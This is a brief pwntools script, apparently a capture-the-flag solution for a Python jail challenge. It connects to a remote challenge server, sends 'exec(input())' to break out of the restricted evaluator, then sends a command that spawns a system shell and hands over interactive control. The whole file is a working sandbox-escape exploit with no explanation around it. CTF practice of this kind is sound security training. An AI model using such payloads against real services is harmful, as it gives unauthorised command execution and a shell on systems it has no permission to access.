from pwn import *

#conn = process(["python3", "main.py"])
conn = remote("pyprison.ictf.kctf.cloud", 1337)

conn.sendline(b"exec(input())")
conn.sendline(b"__import__('os').system('sh')")
conn.interactive()
